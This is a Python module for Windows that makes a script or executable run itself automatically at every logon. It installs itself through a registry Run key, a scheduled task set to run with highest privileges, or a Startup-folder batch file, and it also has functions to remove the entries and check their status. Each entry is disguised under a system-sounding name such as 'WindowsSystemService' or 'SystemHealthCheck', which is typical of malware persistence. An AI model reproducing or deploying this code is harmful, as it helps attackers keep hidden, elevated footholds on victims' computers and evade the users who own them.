import os
import winreg
import subprocess
import getpass
import sys

def setup_persistence(method="registry"):
    """Setup persistence based on chosen method."""
    script_path = os.path.abspath(__file__)
    if method == "registry":
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, f"python {script_path}")
        winreg.CloseKey(key)

    elif method == "schtask":
        task_name = "SystemHealthCheck"
        subprocess.run(f'schtasks /create /sc ONLOGON /tn {task_name} /tr "python {script_path}" /rl HIGHEST', shell=True)

    elif method == "startup":
        startup_folder = f"C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        with open(f"{startup_folder}\\SystemUpdate.bat", "w") as f:
            f.write(f"@echo off\npython {script_path}\n")

def setup_current_persistence(method="registry"):
    """Setup persistence for the current executable/script."""
    if getattr(sys, 'frozen', False):
        # Running as exe
        current_path = sys.executable
    else:
        # Running as script
        current_path = os.path.abspath(__file__)
    
    if method == "registry":
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsSystemService", 0, winreg.REG_SZ, current_path)
            winreg.CloseKey(key)
            return True, "Registry persistence set successfully."
        except Exception as e:
            return False, f"Registry persistence failed: {e}"

    elif method == "schtask":
        try:
            task_name = "WindowsSystemService"
            subprocess.run(f'schtasks /create /sc ONLOGON /tn {task_name} /tr "{current_path}" /rl HIGHEST /f', shell=True, check=True)
            return True, "Scheduled task persistence set successfully."
        except Exception as e:
            return False, f"Scheduled task persistence failed: {e}"

    elif method == "startup":
        try:
            startup_folder = f"C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            bat_path = f"{startup_folder}\\WindowsSystemService.bat"
            with open(bat_path, "w") as f:
                f.write(f'@echo off\nstart "" "{current_path}"\n')
            return True, "Startup folder persistence set successfully."
        except Exception as e:
            return False, f"Startup folder persistence failed: {e}"
    
    return False, "Invalid persistence method."

def remove_persistence(method="all"):
    """Remove persistence for the current executable/script."""
    results = []
    
    if method == "all" or method == "registry":
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "WindowsSystemService")
            winreg.CloseKey(key)
            results.append("Registry persistence removed.")
        except Exception as e:
            results.append(f"Registry removal failed: {e}")

    if method == "all" or method == "schtask":
        try:
            subprocess.run('schtasks /delete /tn "WindowsSystemService" /f', shell=True, check=True)
            results.append("Scheduled task persistence removed.")
        except Exception as e:
            results.append(f"Scheduled task removal failed: {e}")

    if method == "all" or method == "startup":
        try:
            startup_folder = f"C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            bat_path = f"{startup_folder}\\WindowsSystemService.bat"
            if os.path.exists(bat_path):
                os.remove(bat_path)
                results.append("Startup folder persistence removed.")
            else:
                results.append("Startup folder persistence not found.")
        except Exception as e:
            results.append(f"Startup folder removal failed: {e}")
    
    return results

def check_persistence_status():
    """Check current persistence status."""
    status = []
    
    # Check registry
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_READ)
        try:
            value = winreg.QueryValueEx(key, "WindowsSystemService")
            status.append(f"Registry: Active ({value[0]})")
        except FileNotFoundError:
            status.append("Registry: Not active")
        winreg.CloseKey(key)
    except Exception as e:
        status.append(f"Registry: Error checking - {e}")

    # Check scheduled task
    try:
        result = subprocess.run('schtasks /query /tn "WindowsSystemService"', shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            status.append("Scheduled Task: Active")
        else:
            status.append("Scheduled Task: Not active")
    except Exception as e:
        status.append(f"Scheduled Task: Error checking - {e}")

    # Check startup folder
    try:
        startup_folder = f"C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        bat_path = f"{startup_folder}\\WindowsSystemService.bat"
        if os.path.exists(bat_path):
            status.append("Startup Folder: Active")
        else:
            status.append("Startup Folder: Not active")
    except Exception as e:
        status.append(f"Startup Folder: Error checking - {e}")
    
    return status